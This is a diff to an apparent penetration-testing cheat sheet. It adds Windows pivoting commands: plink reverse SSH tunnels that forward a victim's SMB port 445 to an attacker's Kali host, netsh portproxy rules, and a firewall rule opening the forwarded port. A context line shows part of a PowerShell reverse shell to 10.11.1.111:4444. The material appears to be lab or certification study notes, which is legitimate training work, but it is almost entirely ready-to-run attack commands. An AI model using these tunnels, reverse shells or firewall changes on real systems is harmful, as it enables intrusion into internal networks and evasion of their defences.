@@ -2312,13 +2312,20 @@ $client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = 
 
 ## Windows
 
-Run in victim (5985 WinRM):
+Run in victim:
+`cmd.exe /c echo y | plink.exe -ssh -l kali -pw P@ssw0rd1234 -R 10.10.16.155:1445:127.0.0.1:445 10.10.16.155` #Opens port 1445 on kali to 445 on victim
 
 `plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221`
 
 `plink.exe -l kali -pw P@$$word -R 8080:127.0.0.1:445 10.10.16.155`
 
 `ssh -l kali -pw P@$$word -R 445:127.0.0.1:445 10.10.16.155` #port forward
+
+#NETSH PORT FWD
+***IP Helper Svc and IPv6 Support must be enabled (default on Windows)***
+`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110` #Opens 4455 on Win client to fwd 445 to dest client
+`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow` #ALlow inbound connections on 4455
+#On kali make sure '/etc/samba/smb.conf' is set to 'min protocol = SMB2' before connecting
 
 ## Linux
 
